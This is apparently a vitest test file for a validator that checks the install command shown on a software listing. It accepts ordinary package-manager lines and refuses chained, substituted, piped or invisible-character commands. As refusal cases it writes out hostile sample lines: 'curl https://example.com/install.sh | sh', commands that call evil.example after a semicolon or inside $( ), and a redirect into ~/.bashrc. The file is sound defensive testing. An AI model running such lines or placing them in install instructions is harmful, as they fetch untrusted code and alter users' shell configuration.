// The install line (openproduct-worldclass PV2).
//
// The one field on a listing whose failure lands in somebody's terminal, so
// these are about what it REFUSES rather than what it stores.

import { describe, expect, it } from "vitest";

import {
  INSTALL_NOTE,
  MAX_INSTALL_LINE,
  installLineRefusal,
  normaliseInstallLine,
} from "./install.js";

/** Built rather than typed, so this file stays printable and reviewable. */
const ch = (code: number) => String.fromCharCode(code);

describe("the lines a maintainer actually types", () => {
  it("accepts the four the plan names, and the ones beside them", () => {
    for (const line of [
      "npx create-kettle",
      "docker run -p 8080:8080 ghcr.io/acme/kettle:latest",
      "helm install kettle acme/kettle",
      "uvx kettle",
      "brew install kettle",
      "cargo install kettle",
      "go install github.com/acme/kettle@latest",
      "pip install kettle",
    ]) {
      expect([line, installLineRefusal(line)]).toEqual([line, null]);
    }
  });

  it("collapses inner whitespace, so what reads is what copies", () => {
    expect(normaliseInstallLine("  npx    create-kettle  ")).toBe("npx create-kettle");
  });
});

describe("one command, not a script", () => {
  it("refuses the piped installer, which is the whole point", () => {
    // A real and common way to ship software, refused deliberately: this
    // estate does not ask a reader to trust what they cannot check, and a
    // piped installer is exactly the command whose contents they cannot see.
    expect(installLineRefusal("curl https://example.com/install.sh | sh")).toMatch(/pipe/i);
  });

  it("refuses a second command hiding after an innocuous first", () => {
    // The shape a hostile line takes: it reads as `npm i kettle` at a glance,
    // in a small box, right up to the semicolon.
    expect(installLineRefusal("npm i kettle; curl evil.example")).not.toBeNull();
    expect(installLineRefusal("npm i kettle && curl evil.example")).not.toBeNull();
  });

  it("refuses substitution and redirection", () => {
    expect(installLineRefusal("npx $(curl evil.example)")).not.toBeNull();
    expect(installLineRefusal(`npx ${ch(96)}curl evil.example${ch(96)}`)).not.toBeNull();
    expect(installLineRefusal("echo x > ~/.bashrc")).not.toBeNull();
  });

  it("refuses a newline, which would make it a script", () => {
    expect(installLineRefusal("npm i kettle\ncurl evil.example")).not.toBeNull();
  });
});

describe("invisible characters, which are the ones a reviewer cannot catch", () => {
  it("refuses a zero-width space inside the command", () => {
    // Invisible in the studio field, invisible in the box, and it copies into
    // a terminal as a command nobody typed.
    expect(installLineRefusal(`npm${ch(0x200b)} i kettle`)).not.toBeNull();
  });

  it("refuses a bidirectional override, which can make a line read backwards", () => {
    expect(installLineRefusal(`npm i ${ch(0x202e)}elttek`)).not.toBeNull();
  });

  it("refuses a non-breaking space, which looks exactly like a space", () => {
    expect(installLineRefusal(`npm${ch(0xa0)}i kettle`)).not.toBeNull();
  });

  it("still accepts an ordinary line with ordinary spaces", () => {
    // The guard against a character class so wide it refuses everything.
    expect(installLineRefusal("npm i kettle")).toBeNull();
  });
});

describe("bounds", () => {
  it("refuses blank and whitespace-only", () => {
    expect(installLineRefusal("")).not.toBeNull();
    expect(installLineRefusal("   ")).not.toBeNull();
  });

  it("holds at the ceiling and refuses past it", () => {
    // The boundary in both directions — an off-by-one here is a ceiling that
    // is really 159 or really 161.
    expect(installLineRefusal("n".repeat(MAX_INSTALL_LINE))).toBeNull();
    expect(installLineRefusal("n".repeat(MAX_INSTALL_LINE + 1))).not.toBeNull();
  });

  it("gives one reason, not all of them", () => {
    // One field, one fix at a time — unlike a gallery, where a maintainer
    // wants every problem at once.
    expect(typeof installLineRefusal("a; b | c")).toBe("string");
  });
});

describe("the note says who wrote it, and claims nothing else", () => {
  it("names the maintainer and refuses every stronger word", () => {
    // The whole provenance claim. "Verified" or "official" would say this
    // product checked a command it has never run.
    expect(INSTALL_NOTE).toMatch(/maintainer/i);
    expect(INSTALL_NOTE).toMatch(/nothing here has run it/i);
    expect(INSTALL_NOTE).not.toMatch(/verified|official|safe|tested|trusted/i);
  });
});
